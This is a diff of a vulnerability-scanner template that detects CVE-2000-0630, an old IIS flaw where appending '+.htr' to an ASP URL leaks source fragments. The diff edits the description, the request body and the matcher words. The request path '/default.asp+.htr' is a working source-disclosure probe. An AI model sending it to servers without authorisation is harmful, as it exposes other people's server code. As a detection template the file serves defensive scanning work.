@@ -1,6 +1,6 @@
 [info]
 author = "ave"
-description = "验证 Microsoft IIS 4.0/5.0 .HTR 文件片段读取漏洞，通过在 URL 后追加 +.htr 后缀触发源代码泄露"
+description = "检测 Microsoft IIS 4.0/5.0 通过 +.htr 后缀泄露 ASP 源码片段漏洞"
 id = "POC-AVE-2000-0484"
 name = "CVE-2000-0630 PoC"
 severity = "medium"
@@ -18,6 +18,10 @@ method = "GET"
 path = "/default.asp+.htr"
 protocol = "http"
 
+[poc.requests.body]
+content = ""
+type = "raw"
+
 [poc.requests.headers]
 User-Agent = "AVE/1.0"
 
@@ -27,16 +31,14 @@ part = "body"
 type = "word"
 words = [
     "<%",
-    "<script",
+    "%>",
+    "<%@",
     "Response.Write",
     "Server.CreateObject",
-    "<%",
-    "<%@",
-    "VBScript",
-    "JScript",
 ]
 
 [[poc.requests.matchers]]
 expect = true
+part = "header"
 status = [200]
 type = "status"
